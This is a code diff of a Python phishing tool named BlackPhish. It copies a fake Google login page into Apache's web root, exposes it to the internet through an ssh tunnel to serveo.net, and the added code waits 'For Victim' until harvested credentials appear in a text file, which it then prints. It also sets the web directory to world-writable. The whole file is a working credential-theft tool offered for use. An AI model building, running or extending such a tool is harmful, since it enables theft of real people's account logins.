@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# version 2.3: - Added Check Internet
+# version 3: - Finshed
 
 # Please update version number each time we update
 
@@ -10,6 +10,7 @@ try:
     import os
     from time import sleep
     import socket
+    from distutils.dir_util import copy_tree
 except ImportError:
     print("\033[31;1m" + "[!] Import Error, Aborting! \033[0m")
     exit(1)
@@ -32,7 +33,7 @@ blink = "\033[5m"
 if os.geteuid() != 0:
     exit(red + "[!] Please run as root" + reset)
 
-def checkint():
+def checkInternet():
     print(yellow + "[*] Checking connection...")
     try:
         socket.create_connection(("www.google.com", 80))
@@ -43,7 +44,7 @@ def checkint():
         exit(0)
     
 # Port forward to serveo #
-def serveo_forward():
+def serveoForward():
     os.system('ssh -o ServerAliveInterval=3000 -R inc0gnit0:80:localhost:80 serveo.net')
 
 # Banner #
@@ -80,11 +81,13 @@ def banner():
         ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m
         
                 
-                    Banner made by: \033[91;1m[tuf_unkn0wn]\033[94;1m
+                    Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
                     
-                    Script created by: \033[91;1m[inc0gnit0] [retro0001]\033[94;1m
+                    Script created by: \033[91;1m[ inc0gnit0 ] [ retro0001 ]\033[94;1m
                     
-                    Websites created by: \033[91;1m[TableFlipGod]\033[91;1m 
+                    Websites created by: \033[91;1m[ TableFlipGod ]\033[94;1m 
+                    
+                    Big Thanks to: \033[91;1m [ DarkSecDevelopers ]\033[91;1m
                     
                     
                     
@@ -94,12 +97,20 @@ def banner():
         
         
         \033[0m''')
+    
+def endMessage():
+    print("\n")
+    print(red + "  Thank you using BlackPhish\n")
+    print(red + "  If you have any problems while using BlackPhish please report it to us\n")
+    print(red + "  Make Pull Request to support this tool\n")
+    print("\n" + reset)
+    exit(0)
 
 # Main Script #
 def main():
     os.system("clear")
     
-    checkint()
+    checkInternet()
 
     os.system('clear') # clear #
     banner() # Load Banner #
@@ -114,7 +125,7 @@ def main():
         print(green + '[+] Starting Apache2 Service')
         os.system('service apache2 start')
         print(green + '[+] Apache2 Service Started')
-        serveo_forward()
+        serveoForward()
         print(green + '[+] Serveo is working')
         print(green + '[+] Done')
         main()
@@ -124,14 +135,27 @@ def main():
         print(green + '[+] Copying Files')
         print(green + '[+] Cleaning /var/www/html/')
         os.system('rm -r /var/www/html/ && mkdir /var/www/html/')
-        os.system('cp '+'-r '+ cwd  + '/Websites/Google/index.php' " /var/www/html/")
-        os.system('cp '+'-r '+ cwd  + '/Websites/Google/accounts.login.php' " /var/www/html/")
-        os.system('cp '+'-r '+ cwd  + '/Websites/Google/login.php' " /var/www/html/")
-        os.system('cp '+'-r '+ cwd  + '/Websites/Google/usernames.txt' " /var/www/html/")
+        print(green + '[+] Cleaning /Server/www/')
+        os.system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")
+        copy_tree("Websites/Google", "Server/www")
+        copy_tree("Server/www", "/var/www/html")
+        print(green + '[+] Coping to /var/www/html')
+        os.system("chmod -R 777 /var/www/html")
+        print(green + '[+] Changing File Permissions')
         print(green + '[+] Starting Apache2 Service')
         os.system('service apache2 start')
         print(green + '[+] Apache2 Service Started')
-        serveo_forward()
+        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
+        while True:
+            with open('/var/www/html/usernames.txt') as creds:
+                lines = creds.read().rstrip()
+                if len(lines) != 0:
+                    print(green + "______________________________________________________________________________\n")
+                    print('\n                CREDENTIALS FOUND\n')
+                    os.system("cat /var/www/html/usernames.txt")
+                    print("\n______________________________________________________________________________" + reset)
+                    endMessage()
+                    
         print(green + '[+] Serveo is working')
         print(green + '[+] Done')
         main()
@@ -149,6 +173,8 @@ def main():
         os.system('pkill -f inc0gnit0:80:localhost:80')
         print(green + '[+] Cleaning /var/www/html/')
         os.system('rm -r /var/www/html/ && mkdir /var/www/html')
+        print(green + '[+] Cleaning /Server/www/')
+        os.system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")
         print(green + '[+] Done')
         main()
     
